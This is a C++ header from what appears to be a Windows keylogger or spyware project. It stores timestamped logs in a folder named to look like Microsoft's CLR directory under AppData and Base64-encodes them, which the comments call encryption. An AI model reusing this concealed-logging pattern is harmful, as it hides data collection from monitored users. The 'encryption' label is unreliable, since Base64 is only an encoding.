#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h" // windows API
#include "Helper.h"
#include "Base64.h"

namespace IO {

    std::string GetOurPath(const bool append_separator = false) { // append separator = if the backslash is included at the end of our path

        std::string appdata_dir(getenv("APPDATA")); // getenv - get environment function
        std::string full = appdata_dir + "\\Microsoft\\CLR"; // backslash is an escape character so we need to write 2 to incorporate a backslash in the string

        return full + (append_separator ? "\\" : "");
    }

    bool MkOneDr(std::string path) { // this function fails in a C:\Users\User\Downloads or a C:\Users\\Downloads scenario

        // always returns bool because of (bool)
        return (bool)CreateDirectory(path.c_str(), NULL)
                    || GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool MkDir(std::string path) {

        for(char &c : path)
        {
            if(c == '\\') // like C:\Users\test\Download
            {
                // '\0' is the null terminator
                c = '\0';
                if(!MkOneDr(path))
                {
                    return false;
                }
                c = '\\';
            }
        }
        return true;
    }

    template <class T>
    std::string WriteLog(const T &t) {

        std::string path = GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString("_") + ".log";

        try {

            std::ofstream file(path + name);

            if(!file) // if file cannot be opened or used, then return an empty string
            {
                return "";
            }
            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;

            // encrypt
            std::string data = Base64::EncryptB64(s.str());

            // put string stream into file
            file << data;

            if(!file) // if something is wrong, then return an empty string
            {
                return "";
            }
            file.close();
            return name;
        }
        catch(...) {

            return "";
        }
    }
}
#endif // IO_H
